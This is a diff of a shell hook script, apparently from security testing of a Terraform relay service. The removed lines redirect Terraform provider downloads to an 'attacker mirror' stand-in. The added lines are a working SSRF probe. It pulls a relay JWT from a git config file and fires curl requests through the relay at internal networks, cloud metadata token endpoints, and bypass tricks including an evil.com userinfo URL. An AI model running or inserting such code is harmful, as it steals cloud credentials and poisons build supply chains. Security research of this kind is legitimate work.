@@ -1,40 +1,42 @@
 #!/usr/bin/env bash
-# PRE-INIT SUPPLY CHAIN DEMO
-# Runs BEFORE Terraform initializes plugins.
-# Overwrites TF_CLI_CONFIG_FILE (not ~/.terraformrc) to redirect provider downloads.
-# Also clears plugin cache so provider must be re-downloaded.
+# SCALRCORE-38322 SSRF gap probe — pre-plan hook.
 
-echo "=== PRE-INIT: environment ==="
-echo "TF_CLI_CONFIG_FILE=${TF_CLI_CONFIG_FILE}"
-echo "TF_PLUGIN_CACHE_DIR=${TF_PLUGIN_CACHE_DIR}"
+JWT=$(grep -oP '(?<=x-relay-authorization:).+' "$XDG_CONFIG_HOME/git/config")
+POOL=apool-v0p88m73bm13hgqhg
+RELAY=https://relay.main.scalr.dev
 
-echo ""
-echo "=== PRE-INIT: clear provider cache to force re-download ==="
-if [ -d "${TF_PLUGIN_CACHE_DIR}" ]; then
-    CACHE_BEFORE=$(find "${TF_PLUGIN_CACHE_DIR}" -name "terraform-provider-*" 2>/dev/null | wc -l)
-    echo "Cached providers before: $CACHE_BEFORE"
-    rm -rf "${TF_PLUGIN_CACHE_DIR}/registry.terraform.io/hashicorp/null"
-    echo "Deleted null provider from cache — will force download from mirror"
-else
-    echo "No cache dir found"
-fi
-
-echo ""
-echo "=== PRE-INIT: overwrite TF_CLI_CONFIG_FILE with attacker mirror ==="
-echo "Writing to: ${TF_CLI_CONFIG_FILE}"
-cat > "${TF_CLI_CONFIG_FILE}" << 'TFRC'
-provider_installation {
-  network_mirror {
-    url     = "https://httpbin.org/anything/"
-    include = ["registry.terraform.io/*/*"]
-  }
-  direct {
-    exclude = ["registry.terraform.io/*/*"]
-  }
+run() {
+  local label=$1; shift
+  local code
+  code=$(curl -s -o /tmp/b -w "%{http_code}" --max-time 8 \
+    -H "x-relay-authorization: $JWT" \
+    -H "X-Relay-Agent-Pool-ID: $POOL" \
+    "$@" 2>&1)
+  local body
+  body=$(head -c 160 /tmp/b 2>/dev/null | tr -d '\n' | tr -c '[:print:]' ' ')
+  echo "RESULT|$label|$code|$body"
 }
-TFRC
-echo "New config:"
-cat "${TF_CLI_CONFIG_FILE}"
-echo ""
-echo "Terraform init will now contact httpbin.org/anything/ for hashicorp/null provider"
-echo "(attacker server stand-in — in real attack serves malicious binary)"
+
+echo "=== SSRF PROBE START ==="
+echo "jwt_len=${#JWT} pool=$POOL"
+
+run "01a-rfc1918-10"     "$RELAY/http://10.0.0.1/"
+run "01b-rfc1918-192"    "$RELAY/http://192.168.1.1/"
+run "01c-rfc1918-172"    "$RELAY/http://172.16.0.1/"
+run "02-dns-rebind"      "$RELAY/http://x.169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+run "03a-ipv6-loop"      "$RELAY/http://[::1]:8080/"
+run "03b-ipv6-ula"       "$RELAY/http://[fc00::1]/"
+run "03c-ipv6-linkloc"   "$RELAY/http://[fe80::1]/"
+run "04-alibaba-meta"    "$RELAY/http://100.100.100.200/latest/meta-data/"
+run "05-bare-metadata"   "$RELAY/http://metadata/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+run "06a-zero-ip"        "$RELAY/http://0.0.0.0:22/"
+run "06b-zero-short"     "$RELAY/http://0/"
+run "07-userinfo"        "$RELAY/http://metadata.google.internal@evil.com/"
+run "08-url-encoded"     --path-as-is "$RELAY/http://%6D%65%74%61data.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
+run "09-public-exfil"    "$RELAY/https://httpbin.org/get"
+run "CTRL-gcp-meta"      "$RELAY/http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+run "CTRL-aws-meta"      "$RELAY/http://169.254.169.254/latest/meta-data/"
+run "CTRL-loopback"      "$RELAY/http://127.0.0.1/"
+
+echo "=== SSRF PROBE END ==="
+exit 0
